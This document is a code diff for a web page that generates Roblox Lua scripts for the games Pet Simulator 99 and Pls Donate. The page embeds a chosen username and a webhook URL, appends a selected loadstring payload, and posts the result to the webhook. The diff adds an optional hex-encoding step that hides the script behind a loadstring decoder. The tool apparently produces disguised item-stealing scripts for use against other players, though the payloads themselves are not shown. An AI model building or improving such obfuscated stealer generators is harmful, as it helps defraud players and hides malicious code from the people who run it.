@@ -12,6 +12,7 @@
         button:hover{background:#ff0055;transform:scale(1.1);}
         #generated-script{display:none;background:rgba(0,0,0,0.7);padding:15px;border-radius:8px;box-shadow:0 0 15px rgba(0,0,0,0.7);text-align:center;margin-top:20px;max-width:80%;width:100%;}
         textarea{width:100%;height:100px;background:#222;color:white;border:none;padding:10px;border-radius:5px;font-size:1rem;resize:none;}
+        label { font-size: 1rem; margin-top: 10px; }
     </style>
 </head>
 <body>
@@ -26,6 +27,7 @@
             <option value="Pet Simulator 99">Pet Simulator 99</option>
             <option value="Pls Donate">Pls Donate</option>
         </select>
+        <label><input type="checkbox" id="obfuscate-option"> Enable Obfuscation</label>
         <button onclick="generateScript()">Generate Script</button>
     </div>
     <div id="generated-script">
@@ -46,6 +48,7 @@
         let username = document.getElementById('username').value;
         let webhook = document.getElementById('webhook').value;
         let selectedScript = document.getElementById('script-select').value;
+        let obfuscate = document.getElementById('obfuscate-option').checked;
 
         if (!username || !webhook) {
             alert("Please enter both Username and Webhook URL!");
@@ -56,12 +59,13 @@
 
 Webhook = "${webhook}" ${loadstrings[selectedScript]}`;
 
-let hexEncodedScript = textToHex(script);
-        let luaDecoderScript = `local hex = "${hexEncodedScript}"
+if (obfuscate) {
+            let hexEncodedScript = textToHex(script);
+            script = `local hex = "${hexEncodedScript}"
 
-local decoded = "" for i=1, #hex-1, 2 do decoded = decoded .. string.char(tonumber(hex:sub(i, i+1), 16)) end loadstring(decoded)()`;
+local decoded = "" for i=1, #hex-1, 2 do decoded = decoded .. string.char(tonumber(hex:sub(i, i+1), 16)) end loadstring(decoded)()`; }
 
-sendToWebhook(webhook, luaDecoderScript);
+sendToWebhook(webhook, script);
     }
 
     function sendToWebhook(webhook, scriptContent) {
@@ -74,7 +78,7 @@ sendToWebhook(webhook, luaDecoderScript);
             body: formData
         }).then(response => {
             if (response.ok) {
-                alert("Obfuscated script sent successfully!");
+                alert("Script sent successfully!");
             } else {
                 alert("Failed to send script to webhook.");
             }
